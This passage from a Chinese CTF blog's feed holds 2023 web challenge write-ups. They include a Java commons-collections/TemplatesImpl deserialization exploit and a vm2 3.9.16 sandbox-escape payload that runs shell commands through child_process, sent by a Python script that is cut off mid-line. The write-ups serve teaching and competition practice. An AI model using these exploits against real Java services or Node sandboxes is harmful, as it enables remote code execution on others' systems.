class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;whatever&quot;</span>, myexpect);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的内容是跟据题目后半段给出的提示得出的结论</p><p>然后跟了一下他的执行流程</p><p><img src="../images/image-20230529214233881.png" alt="image-20230529214233881"></p><p>最后是在这执行我们的恶意类的，至于怎么执行的我没跟进去，因为尝试了一下，发现太多了，跟不过来</p><p>接下来我们就找谁调用了这个<code>jsonObject.put()</code>方法</p><p>这里话是给了一个<code>cc链</code>的一个jar包  我们可以去考虑一下是否存在利用链可以调用这个put方法</p><p><img src="../images/image-20230529215754130.png" alt="image-20230529215754130"></p><p>发现这里<code>JSONObjetc.class</code>这个类里边引用了别的类，这<code>Map</code>刚好和cc链里边的东西对应上，因为cc链里面也是有很多用到<code>Map</code></p><p><img src="../images/image-20221010090837206-16853688281281.png" alt="img"></p><p>根据这张对cc链总结的图片</p><p>我们据此可以联想到一个很特殊的<code>Map</code>—<code>org.apache.commons.collections.map.LazyMap</code>。</p><p><img src="../images/image-20230529220631061.png" alt="image-20230529220631061"></p><p>这里话刚好可以调用到</p><p>(这里的map在序列化的时候可控,并且key可控，value也可控)</p><p>因为cc链都是和<code>transform</code>有关，再加上这里存在，所以刚好可以利用这里来控制这个<code>value</code></p><p><img src="../images/image-20230529220919526.png" alt="image-20230529220919526"></p><p><code>factory</code>也可控</p><p>那么根据图上的内容—-&gt;<code>cc链</code>   只要我们能调用到<code>LazyMap.get</code>方法就行，那么就有好几种方法来进行调用了</p><p>因为有好几种链的组合</p><p>这里的话就先讲一种，就是利用<code>cc6</code>这条链子来</p><p><strong>DeserExp.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserExp</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\b.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fuck&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Myexcpt</span> <span class="variable">myexcpt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexcpt</span>();</span><br><span class="line">        myexcpt.setTargetclass(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class);</span><br><span class="line">        myexcpt.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">        myexcpt.setTypearg(<span class="keyword">new</span> <span class="title class_">Templates</span>[]&#123;templatesimpl&#125;);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(jsonObject,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        jsonObject.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(myexcpt));</span><br><span class="line">        System.out.println(serial(hashMap));</span><br><span class="line">        <span class="comment">//deserial(serial(hashMap));</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cserialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">cunserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个exp的话是利用<code>cc6</code>和<strong>动态类加载</strong>这两个执行方法来进行的(<strong>因为题目给的提示</strong>)</p><p>(这里的不用<code>InvokerTransfomer</code>的原因是这个版本是3.2.2，搬掉了3.2.1版本的<code>InvokerTransfomer</code>)</p><p><img src="../images/image-20230530162437944.png" alt="image-20230530162437944"></p><p>所以就剩最后这里可以进行调用了</p><p><img src="../images/image-20230530154121909.png" alt="image-20230530154121909"></p><p>所以这里就会用到动态类加载</p><p>这个exp好多东西都是固定的，只要修改一下让<code>LazyMap.get()</code>触发到<code>JSONObject.put()</code>方法就行了</p><p><img src="../images/image-20230530160454285.png" alt="image-20230530160454285"></p><p>这里的话就刚好可以执行到这一步，那么就可以成功进行恶意代码的执行了</p>]]></content>
      
      
      
        <tags>
            
            <tag> ciscn-2023-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show-sql注入</title>
      <link href="/posts/913f001f.html"/>
      <url>/posts/913f001f.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="57017d4ab20bf6199a989222a9600a362b25724231aa36e1e867d8638d98ff55"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> show-sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show-文件上传</title>
      <link href="/posts/fb2e5b27.html"/>
      <url>/posts/fb2e5b27.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cfccd782e60840a2cfcca0753acd33d7e0e1ffad4556d091fbd7fe78ee518ea1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> show-文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show-文件包含</title>
      <link href="/posts/93915e83.html"/>
      <url>/posts/93915e83.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1eb400062c440847fd27419525628884f75f8f988dcb32490147332db042f29f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> show-文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>上海磐石行动-web-2023</title>
      <link href="/posts/d4cd86c8.html"/>
      <url>/posts/d4cd86c8.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://fushuling.com/index.php/2023/05/21/%e7%ac%ac%e5%85%ab%e5%b1%8a%e4%b8%8a%e6%b5%b7%e5%b8%82%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8%e5%a4%a7%e8%b5%9b%e6%9a%a8%e7%a3%90%e7%9f%b3%e8%a1%8c%e5%8a%a820/">参考wp</a></p><h2 id="CookieBack"><a href="#CookieBack" class="headerlink" title="CookieBack"></a>CookieBack</h2><p>题目</p><p><img src="../images/image-20230523201738862.png" alt="image-20230523201738862"></p><p>这题太傻逼了，我以为得需要用这个搜索框来查出一些东西来解题，一直卡在这个思路上面</p><p><img src="../images/image-20230523201839121.png" alt="image-20230523201839121"></p><p>其实这里说的偷cookie，其实就是把自己的cookie传进去就行了…….</p><p><img src="../images/image-20230523202009372.png" alt="image-20230523202009372"></p><p>特别的离谱……….</p><h2 id="easy-node"><a href="#easy-node" class="headerlink" title="easy_node"></a>easy_node</h2><p>这是个nday的题目</p><p>访问/src就能拿到源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line">session_secret = <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">substr</span>(<span class="number">2</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>(session_secret));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123; <span class="attr">secret</span>: session_secret, <span class="attr">resave</span>: <span class="literal">true</span>, <span class="attr">saveUninitialized</span>: <span class="literal">true</span> &#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyArray</span>(<span class="params">arr1</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(arr1.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr1.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr1[i] <span class="keyword">instanceof</span> <span class="title class_">Object</span>)&#123;</span><br><span class="line">            arr2[i] = <span class="title function_">copyArray</span>(arr1[i])</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            arr2[i] = arr1[i]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;see `/src`&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vm2_tester&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">name</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = &#123;<span class="string">&quot;username&quot;</span>: req.<span class="property">body</span>.<span class="property">name</span>&#125;</span><br><span class="line">        <span class="keyword">const</span> properties = req.<span class="property">body</span>.<span class="property">properties</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; properties.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (properties[i] == <span class="string">&#x27;vm2_tester&#x27;</span>) &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;cant set vm2_tester by self&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span> = <span class="title function_">copyArray</span>(properties)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Success&#x27;</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;input username&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vm2&#x27;</span>,<span class="keyword">function</span>  (<span class="params">req, res</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>.<span class="property">length</span>; i++)</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>[i] == <span class="string">&#x27;vm2_tester&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="regexp">/\b(?:function)\b/</span>.<span class="title function_">test</span>(req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">                        res.<span class="title function_">send</span>(<span class="string">&quot;define function not allowed&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="regexp">/\b(?:getPrototypeOf)\b/</span>.<span class="title function_">test</span>(req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">                        res.<span class="title function_">send</span>(<span class="string">&quot;define getPrototypeOf not allowed&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line">                    res.<span class="title function_">send</span>(vm.<span class="title function_">run</span>(req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>]))</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&quot;input code&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;not vm2 tester rights&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;see `/src`,use vm2 3.9.16&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;app.js&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230523202607587.png" alt="image-20230523202607587"></p><p>这里因为给了这个vm2的版本，于是就去google搜索，于是第一个就是</p><p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p><p>这里当时卡住的原因是因为</p><p><img src="../images/image-20230523203752773.png" alt="image-20230523203752773"></p><p>所以当时就很疑惑，不知道怎么绕过他</p><p>然后看到别人给的wp</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>: <span class="number">123</span>,<span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;length&quot;</span>: <span class="number">1</span>,<span class="string">&quot;0&quot;</span>:&#123;<span class="string">&quot;0&quot;</span>: <span class="string">&quot;vm2_tester&quot;</span>,<span class="string">&quot;length&quot;</span>:<span class="number">1</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230523203841137.png" alt="image-20230523203841137"></p><p>gpt给出的解释</p><p>这里能这样写来绕过是因为</p><p><img src="../images/image-20230523204429937.png" alt="image-20230523204429937"></p><p>这三个地方的缘故</p><p>其实就是跟上面的这个<code>copyArray</code>函数有很大的关系</p><p><code>&#123;&quot;name&quot;: 123,&quot;properties&quot;:&#123;&quot;length&quot;: 1,&quot;0&quot;:&#123;&quot;0&quot;: &quot;vm2_tester&quot;,&quot;length&quot;:1&#125;&#125;&#125;</code></p><p>就是<code>properties</code>这个key值的长度是1，然后又因为arr1[0]是一个对象，然后满足第一个判断，然后到最后返回的<code>arr2</code>就是<code>&#123;&quot;0&quot;:&#123;&quot;0&quot;: &quot;vm2_tester&quot;,&quot;length&quot;:1&#125;&#125;</code>这个玩意了</p><p>然后<code>req.session.user.properties[i]</code>就等于<code>&#123;&quot;0&quot;:&#123;&quot;0&quot;: &quot;vm2_tester&quot;,&quot;length&quot;:1&#125;&#125;</code></p><p><img src="../images/image-20230523205118270.png" alt="image-20230523205118270"></p><p>这样的话就可以同时解决上面提出的矛盾了   主要还是归功于上面的那个<code>copyArray</code>函数了</p><p><strong>最后的code代码执行就是前面搜的那篇文章里的内容了</strong></p><p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p><p><img src="../images/image-20230523205306489.png" alt="image-20230523205306489"></p><p>然后这里得需要python发包，bp和hackbar不行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://116.236.144.37:26806/vm2&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;eval(\&quot;const stack=()=&gt;&#123;new Error().stack;stack();&#125;;err = &#123;&#125;;const handler = &#123;getPr\&quot;+\&quot;ototypeOf(target) &#123;(stack)();&#125;&#125;;const proxiedErr = new Proxy(err, handler);try &#123;throw proxiedErr;&#125; catch (&#123;constructor: c&#125;) &#123;c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /f*&#x27;);&#125;\&quot;)&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span 